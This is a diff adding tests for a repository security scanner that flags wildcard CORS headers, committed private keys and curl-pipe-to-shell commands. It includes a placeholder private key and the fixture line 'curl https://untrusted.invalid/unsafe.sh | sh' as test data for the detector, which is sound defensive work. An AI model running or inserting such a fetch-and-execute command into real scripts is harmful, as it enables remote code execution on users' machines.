@@ -49,3 +49,25 @@ test("persisted Agent Bridge authorization remains revocable through Security se
   assert.ok(native.includes("config.enabled_profiles.is_empty()"));
   assert.ok(native.includes("revoke_all_access_clears_runtime_profiles_and_approval_policy"));
 });
+
+test("repository security inventory finds every occurrence and prohibits unsafe browser/CLI bridges", () => {
+  const source = [
+    "Access-Control-Allow-Origin: *",
+    "Access-Control-Allow-Origin: *",
+    "-----BEGIN PRIVATE KEY-----\nQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\n-----END PRIVATE KEY-----",
+    "curl https://untrusted.invalid/unsafe.sh | sh"
+  ].join("\n");
+  const events = scanDangerous("ghostftp-desktop/src-tauri/src/bridge.rs", source);
+  assert.equal(events.filter((event) => event.id === "unsafe-local-cors").length, 2);
+  assert.ok(events.some((event) => event.id === "private-key-literal"));
+  assert.ok(events.some((event) => event.id === "curl-pipe-shell"));
+  assert.deepEqual(events.filter((event) => event.id === "unsafe-local-cors").map((event) => event.line), [1, 2]);
+});
+
+test("PEM format mention is not mistaken for a committed private key", () => {
+  assert.deepEqual(
+    scanDangerous("ghostftp-desktop/src-tauri/src/keys.rs",
+      '/// OpenSSH uses -----BEGIN OPENSSH PRIVATE KEY----- as a header.'),
+    [],
+  );
+});
